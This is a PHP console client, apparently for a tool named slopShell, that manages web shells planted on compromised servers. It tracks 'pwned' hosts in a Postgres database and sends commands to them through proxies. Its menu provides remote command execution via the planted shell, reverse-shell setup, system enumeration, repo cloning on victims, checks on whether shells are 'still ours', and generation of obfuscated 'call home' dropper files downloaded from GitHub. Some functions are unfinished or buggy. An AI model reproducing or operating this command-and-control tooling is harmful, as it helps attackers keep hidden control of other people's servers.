<?php
require "includes/db/postgres_checker.php";
$cof = array(
    "useragent"=> "sp1.1",
    "proxy"=> "127.0.0.1:8090",
    "host"=>"127.0.0.1",
    "port"=>"5432",
    "username"=>"postgres",
    "password"=>"",
    "dbname"=>"sloppy_bots"
    );
// this is failing to execute, but does work everywhere else.
pclose(popen("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &", "r"));
is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
try{
//    $ch = curl_init();
    define("CHH", curl_init());
    curl_setopt(CHH, CURLOPT_USERAGENT,       config['useragent']);
    curl_setopt(CHH, CURLOPT_PROXY,           config["proxy"]);
}catch (Exception $e){
    print("{$e}\n\n");
}

function menu($clear)
{
    if (!empty($clear)) {
        system($clear);
    }
    echo("\033[33;40m                                                                                    \033[0m\n");
    echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
    echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
    echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
    echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
    echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
    echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
    echo("\033[33;40m                                                                                    \033[0m\n");
    echo("\033[33;40m");
    echo <<< _MENU
        (O)ptions                                                                   
        (S)ystem enumeration                                                        
        (R)everse shell                                                             
        (C)ommand Execution                                                         
        (CL)oner
        (CR)eate Dropper                                                                  
        (U)pdates  -> not implemented yet.                                                                 
        (A)dd new host                                                              
        (CH)eck if hosts are still pwned                                            
        (M)ain menu                                                                 
        (Q)uit                                                                      
_MENU;
    echo "\n\n\033[0m\n";

}

function opts(){
    print("\n\nCurrent options enabled:\n\n");
    foreach (config as $temp=>$values){
        print($temp." => ".$values."\n");
    }
    print("\n".str_repeat("-", 35) . "\n");
    print("\n\nCurrent DB Status:\n\n");
    print(pg_ping()."\n");
    print(pg_port()."\n");
    print(pg_host()."\n");
    print("\n".str_repeat("-", 35) . "\n");
    print("\n\nProxybroker?\n\n");
    print(system("ps aux | grep proxybroker")."\n");
}

function sys($host, $uri)
{
    if (!empty($host) && !empty($userA)) {
        curl_setopt(CHH, CURLOPT_URL,               "$host/$uri?qs=cqBS");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        print("[ !! ] Host was empty... [ !! ]");
    }
    return 0;
}

function rev($host, $shell, $port, $os)
{
    $usePort = null;
    $Ushell = null;
    if (isset($host) and isset($port)) {
        if ($port === "default" && $shell === "default" && $os === "win") {
            $usePort = "1634";
            $Ushell = "powershell";
        } elseif($os === "lin") {
            $usePort = "1634";
            $Ushell = "bash";
        }else{
            $Ushell = $shell;
            $usePort = $port;
        }
        if (!is_null($Ushell)){
            echo "[ !! ] Setting custom options: \n";
            echo "Shell: ".$Ushell."\n";
            echo "OS: ". $os."\n";
        }
        echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
    }

}

function co($command, $host, $uri)
{
    if (!empty($host) && !empty($command) && !empty($uri)) {
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$command");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        print("[ !! ] Host was empty... [ !! ]");
    }
    return 0;
}

function clo($host, $repo, $uri)
{
    if (!empty($host) && !empty($repo) && !empty($uri)){
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS,               "clone=$repo");
        $re = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)){
                case 200:
                    return $re;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }
        }else{
            return 0;
        }
    }else{
        return 0;
    }

}

function createDropper($callHome, $duration, $extras, $obfsucate){
    $file_in = 'includes/droppers/base.php';
    $ob = 'includes/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
    $n = 'includes/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
    if (!empty($callHome) && !empty($duration) && !empty($extras)){
        try{
            switch(is_file("includes/droppers/base.php")){
                case true:
                    echo "We have the dropper downloaded :)\n";
                    break;
                case false:
                    echo "Downloading dropper from github....\n";
                    system("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/droppers/base.php -o includes/droppers/base.php -vH 'User-Agent: Mozilla/5.0'");
                    break;
                default:
                    echo "Something went wrong..\n";
                    break;
            }
            switch (strtolower($obfsucate)){
                case "o"||"y"||"yes":
                    print("Generated dropper will be: {$ob}\n");
                    if (!file_exists($ob)){
                        $fil = fopen($file_in, "r");
                        while (!feof($fil)){

                        }
                        fclose($fil);
                    }
                    break;
                default:
                    if (!file_exists($n)){
                        $fil = fopen($file_in, "r");
                        while (!feof($fil)){

                        }
                        fclose($fil);
                    }
                    print("Generated Dropper will be: {$n}\n");
            }

        }catch (Exception $exception){
            throw new Exception("Could not create dropper.\n");
        }

    }
}

function aHo($host)
{
    $t = new postgres_checker();
    if (!empty($host)){
        if ($t->insertHost($host) != 0){
            echo "Successfully added: $host";
        }else{
            echo "There was an error. Double checking the database.";
            if (!$t->checkDB()){
                echo "There is a sevre error in the db, you need to ensure you have it crated.";
                echo "Attempting to re-create or create the DB.";
                if ($t->createDB()){
                    echo "Created the db successfully! Please re run this command to insert the new host.";
                }
            }else{
                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
                $t->getRecord($host);
            }
        }
    }
}

function check($host, $path, $batch)
{
    if (!empty($batch)){
        switch ($batch){
            case "y":
                $c = pg_exec(DBCONN, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
                $count = pg_exec(DBCONN, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                echo "Pulling: ". pg_fetch_row($count)."\nThis could take awhile.";
                curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                foreach (pg_fetch_all($c) as $r){
                    if (!empty($r)){
                        curl_setopt(CHH, CURLOPT_URL,                "$r[0]/$r[1]?qs=cqS");
                        $syst = curl_exec(CHH);
                        if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                            switch ($syst){
                                case 200:
                                    echo "Host is still ours!\n";
                                    break;
                                case 404:
                                    echo "Looks like our shell was caught... sorry..\n";
                                    break;
                                case 500:
                                    echo "Your useragent was not the correct one... did you forget??\n";
                                    break;
                                default:
                                    echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                    break;
                            }
                        }

                    }
                }
                break;
            case "n":
                if (!empty($host) && !empty($path)){
                    curl_setopt(CHH, CURLOPT_URL,               "$host/$path?qs=cqS");
                    curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                    curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                    $syst = curl_exec(CHH);
                    if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                        switch ($syst){
                            case 200:
                                echo "Host is still ours!\n";
                                break;
                            case 404:
                                echo "Looks like our shell was caught... sorry..\n";
                                break;
                            case 500:
                                echo "Your useragent was not the correct one... did you forget??\n";
                                break;
                            default:
                                echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                break;
                        }
                    }
                }
        }
    }
}

function queryDB($host, $fetchWhat){
    # place holder for the query db function. this will check what information we have about a host, and which options to set.
    # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
    # work in progress.
    # @todo
    if (!empty($host) | $host != 0){
        try {
            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
            switch(strtolower($fetchWhat)){
                case "r":
                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    break;
                default:
                    $row = pg_fetch_row($dbC, sprintf("SELECT uri FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                    break;
            }
            if (!empty($row)){
                return $row[0];
            }else{
                return 0;
            }
        }catch (Exception $e){
            return $e;
        }


    }else {
        throw new Exception("Host was 0, are you sure you added it into the DB?\n");
    }
}

(strtolower(php_uname()) == "windows") ? $clears='cls':$clears="clear";
menu($clears);
$run = true;
while ($run) {
    print("\n\033[33;40mPlease select your choice: \n->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    switch (strtolower($pw)) {
        case "cr":
            system($clears);
            $h = readline("Where are we calling home to?\n->");
            $d = readline("How often should we call home?\n->");
            $ob = readline("Do we need to obfuscate?\n->");
            createDropper($h, $d, "1", $ob);
            break;
        case "s":
            system($clears);
            $h = readline("Which host are we checking?\n(right now I only accept IP Addresses.)\n->");
            try {
                sys($h, queryDB($h, "s"));
            }catch (Exception $e){
                menu($clears);
                echo $e."\n";
            }
            break;
        case "r":
            system($clears);
            $h = readline("Please tell me the host.\n->");
            $p = readline("\nWhich port shall we use?\n->");
            try {
                $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
            } catch (Exception $e) {
                menu($clears);
                echo $e."\n";
            }
            echo $o;
            if (!empty($h) && !empty($p)){
                rev($host=$h,"default", $port=$p, $o);
            }
            break;
        case "c":
            system($clears);
            try{
                $h = readline("Which host are we sending the command to?\n(right now I only accept IP Addresses.)\n->");
                $c = readline("And now the command: \n->");
                co($c, $h, queryDB($h, 'c'));
            }catch (Exception $e){
                menu($clears);
                echo $e."\n";
            }
            break;
        case "cl":
            system($clears);
            try{
                $h = readline("Which host are we interacting with?\n->");
                $rep = readline("Repo to clone?\n->");
                clo($h, $rep, queryDB($h, "cl"));
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "u":
            system($clears);
            echo "Will be in future editions.\n";
            break;
        case "a":
            system($clears);
            try{
                $h = readline("Who did we pwn my friend?\n->");
                aHo($h);
            }catch (Exception $e){
                menu($clears);
                echo $e."\n";
            }
            break;
        case "ch":
            system($clears);
            try{
                $h = readline("Who is it we need to check on?\n->");
                $b = readline("Is this going to be a batch job?(Y/N)\n->");
                switch (!empty(strtolower($b))){
                    case "n":
                        echo "Not executing batch job.\n";
                        check($h, queryDB($h, "ch"), "n");
                        break;
                    case "y":
                        echo "Executing batch job!\n";
                        check($h, queryDB($h, "ch"), "y");
                        break;
                    default:
                        echo "Your host was empty, sorry but I will return you to the previous menu.\n";
                        break;
                }
            }catch (Exception $e){
                menu($clears);
                echo $e."\n";
            }
            break;
        case "m":
            menu($clear = "clear");
            break;
        case "q":
            system($clears);
            system("killall proxybroker");
            echo "\033[33;40mGood bye!\033[0m\n";
            $run = false;
            break;
        case "o":
            opts();
            break;
        default:
            menu($clear = "clear");
            echo "\033[33;40myou need to select a valid option...\033[0m\n";
    }
}

